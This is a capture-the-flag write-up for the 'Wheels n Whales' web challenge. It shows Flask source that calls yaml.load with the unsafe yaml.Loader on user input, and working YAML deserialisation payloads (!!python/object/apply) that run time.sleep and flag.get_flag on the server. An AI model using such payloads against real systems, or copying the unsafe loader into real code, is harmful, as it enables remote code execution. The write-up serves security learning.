# Wheels n Whales

## Description
This task gives us a link to a site where you can create a Wheel or a Whale. It asks for different inputs and will create a Wheel or a Whale for you. We are also given the python source code that the site is running.

## Static Analysis
The Python code we get is pretty simple, it has two POST routes, `/wheels` and `/whales`. First we look at how the whale route is handled:

```Python
EASTER_WHALE = {"name": "TheBestWhaleIsAWhaleEveryOneLikes", "image_num": 2, "weight": 34}

...

@app.route("/whale", methods=["GET", "POST"])
def whale():
    if request.method == "POST":
        name = request.form["name"]
        if len(name) > 10: 
            return make_response("Name to long. Whales can only understand names up to 10 chars", 400)
        image_num = request.form["image_num"]
        weight = request.form["weight"]
        whale = Whale(name, image_num, weight)
        if whale.__dict__ == EASTER_WHALE:
            return make_response(flag.get_flag(), 200)
        return make_response(render_template("whale.html.jinja", w=whale, active="whale"), 200)
    return make_response(render_template("whale_builder.html.jinja", active="whale"), 200)
``` 
I see that this route is extracting the form data from the request and putting it into variables. Then it is checking to make sure the name is less than 10 characters long. Finally we are creating a whale object with the data and checking if it is equal to `EASTER_WHALE`. If it is equal then we send the flag!! Easy! All we have to do is send 
```Json
{"name": "TheBestWhaleIsAWhaleEveryOneLikes", "image_num": 2, "weight": 34}
``` 
to the server and we are given the flag right? No. The name "TheBestWhaleIsAWhaleEveryOneLikes" is longer than 10 characters so it will actually send 
```Python
return make_response("Name to long. Whales can only understand names up to 10 chars", 400)
``` 
Now lets take a look at how /wheels works.

```Python
@app.route("/wheel", methods=["GET", "POST"])
def wheel():
    if request.method == "POST":
        if "config" in request.form:
            wheel = Wheel.from_configuration(request.form["config"])
            return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
        name = request.form["name"]
        image_num = request.form["image_num"]
        diameter = request.form["diameter"]
        wheel = Wheel(name, image_num, diameter)
        print(wheel.dump())
        return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
    return make_response(render_template("wheel_builder.html.jinja", active="wheel"), 200)
```
Here we can see that if we send a POST request with "config" in the form data we will run the following two lines:

```Python
wheel = Wheel.from_configuration(request.form["config"])
return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
```
If we look at what `Wheel.from_configuration` is doing we see the following: 
```Python
@staticmethod
def from_configuration(config):
    return Wheel(**yaml.load(config, Loader=yaml.Loader))
```

## Testing
After doing some research I found that we can run/create objects if we can control the input into `yaml.load` (https://webcache.googleusercontent.com/search?q=cache:Z3GtKZReRzoJ:https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf%3Futm_source%3Ddlvr.it%26utm_medium%3Dtwitter+&cd=1&hl=en&ct=clnk&gl=be&client=firefox-b-e). I used `time.sleep(10)` to test the theory on my local machine. 

```Python
import yaml
import time

data = "{'name': !!python/object/apply:time.sleep [10], 'image_num': 2, 'diameter':2}"

class Wheel:
    def __init__(self, name, image_num, diameter):
        self.name = name
        self.image_num = image_num
        self.diameter = diameter

    @staticmethod
    def from_configuration(config):
        return Wheel(**yaml.load(config, Loader=yaml.Loader))
        
    def dump(self):
        return yaml.dump(self.__dict__)

wheel = Wheel.from_configuration(data)
```
If you run this test code you will see that the program will hang for 10 seconds before finishing. 

## Solution
Instead of calling time.sleep() we can call `flag.get_flag()` as they did in the Whale route. I used Postman to send a POST request to wheel route with the form data containing `{config: {'name': !!python/object/apply:flag.get_flag [], 'image_num': 2, 'diameter':2}}`. The server responded with:
```
diameter: 2
image_num: 2
name: CSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?}
```

flag = "CSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?}"